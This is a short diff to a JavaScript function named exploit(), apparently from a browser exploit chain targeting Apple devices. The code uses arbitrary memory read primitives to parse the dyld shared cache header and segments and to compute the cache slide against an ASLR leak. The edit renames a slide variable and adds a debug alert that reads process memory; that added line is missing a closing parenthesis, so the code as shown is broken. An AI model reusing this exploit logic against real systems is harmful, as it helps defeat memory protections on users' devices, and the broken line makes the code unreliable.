@@ -548,10 +548,11 @@ function exploit(){
     memory.u32 = _u32;
         //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
         //tmp = base;
-        var hdr = Add(0x180000000,nslide);
+        var hdr = Add(0x180000000,slide);
         var base_seg = null;
         //var dcache_nsegs = memory.read_i32(base + 0x14);
         var nsegs = memory.u32(Add(hdr,0x14));
+        alert("nsegs + 4000 bytes" + memory.u32(Add(hdr,0x4014))
         log('[+] The dyld shared cache seems to have '+nsegs+' segments.');
         var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
         var segs     = [];
@@ -577,7 +578,7 @@ function exploit(){
             fail("base_seg");
         }
         var cache_slide = Sub(hdr, base_seg.addr);
-        alert ("cacheslides" + cache_slide + "vs aslr leak slide" + nslide);
+        alert ("cacheslides" + cache_slide + "vs aslr leak slide" + slide);
         for(var i = 0; i < segs.length; ++i)
         {
             segs[i].addr = Add(segs[i].addr, cache_slide);
